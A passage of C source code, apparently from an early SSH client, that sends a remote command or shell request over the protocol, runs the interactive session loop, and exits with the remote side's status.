      debug("Sending command: %.*s", len, buffer_ptr(&command));
      packet_start(SSH_CMSG_EXEC_CMD);
      packet_put_string(buffer_ptr(&command), buffer_len(&command));
      packet_send();
      packet_write_wait();
    }
  else
    {
      debug("Requesting shell.");
      packet_start(SSH_CMSG_EXEC_SHELL);
      packet_send();
      packet_write_wait();
    }

  /* Enter the interactive session. */
  exit_status = client_loop(tty_flag, tty_flag ? options.escape_char : -1);

  /* Close the connection to the remote host. */
  packet_close();
  
  /* Exit with the status returned by the program on the remote side. */
  exit(exit_status);
}
